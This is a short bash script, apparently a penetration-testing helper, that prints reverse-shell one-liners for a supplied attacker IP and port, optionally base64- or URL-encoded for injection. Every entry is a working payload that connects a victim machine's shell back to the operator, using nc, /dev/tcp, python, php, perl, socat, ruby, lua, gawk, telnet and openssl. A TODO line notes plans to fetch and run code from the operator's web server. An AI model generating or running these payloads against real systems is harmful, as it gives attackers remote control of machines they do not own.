#!/bin/bash
if [[ -n "$1" ]]; then ip="$1"; else ip="$lip"; fi
if [[ -n "$2" ]]; then port="$2"; else port="53"; fi
if [[ "$3" == 'b64' ]]; then B64='true'; fi
if [[ "$3" == 'url' ]]; then URL='true'; fi

declare -a shell_arr=(
  "rm /var/tmp/.f ; mkfifo /var/tmp/.f ; cat /var/tmp/.f|/bin/sh -i 2>&1|nc $ip $port >/var/tmp/.f"
  "/bin/sh -i >& /dev/tcp/$ip/$port 0>&1"
  "python2 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$ip\",$port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/sh\")'"
  "python3 -c 'import os,pty,socket;s=socket.socket();s.connect((\"$ip\",$port));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(\"/bin/sh\")'"
  "php -r '\$sock=fsockopen(\"$ip\",$port);exec(\"/bin/sh <&3 >&3 2>&3\");'"
  "perl -MIO -e '\$p=fork;exit,if(\$p);\$c=new IO::Socket::INET(PeerAddr,\"$ip:$port\");STDIN->fdopen(\$c,r);$~->fdopen(\$c,w);system\$_ while<>;'"
  "socat TCP:$ip:$port EXEC:/bin/sh"
  "rm -f /tmp/p; mknod /tmp/p p ; telnet $ip $port 0/tmp/p"
  "gawk 'BEGIN {P=$port;S=\"> \";H=\"$ip\";V=\"/inet/tcp/0/\"H\"/\"P;while(1){do{printf S|&V;V|&getline c;if(c){while((c|&getline)>0)print \$0|&V;close(c)}}while(c!=\"exit\")close(V)}}'"
  "ruby -rsocket -e'f=TCPSocket.open(\"$ip\",$port).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'"
  "lua -e \"require('socket');require('os');t=socket.tcp();t:connect('$ip','$port');os.execute('/bin/sh -i <&3 >&3 2>&3');\""
  "ncat $ip $port -e /bin/sh"
  "nc -e /bin/sh $ip $port"
  "nc -c /bin/sh $ip $port"
  "rcat $ip $port -r /bin/sh"
  "/bin/bash -i >& /dev/tcp/$ip/$port 0>&1"
  "mkfifo /var/tmp/.s; /bin/sh -i < /var/tmp/.s 2>&1 | openssl s_client -quiet -connect $ip:443 > /var/tmp/.s; rm /var/tmp/.s" # needs listener with cert! *1
  #"/root/fileserver/lin/print_1.sh"
  # TODO: curl from lip web ; execute
  #TODO: alises, env variables, screen/term settings and etc
)

for i in "${shell_arr[@]}"
do {
    if [[ "$B64" == 'true' ]]; then
        echo "$i"
        echo -n "$i" | base64 -w 0
        echo
        echo
    elif [[ "$URL" == 'true' ]]; then
        echo "$i"
        tourl.py <<< echo "$i" 
        echo
    else
        echo "$i"
    fi
}
done
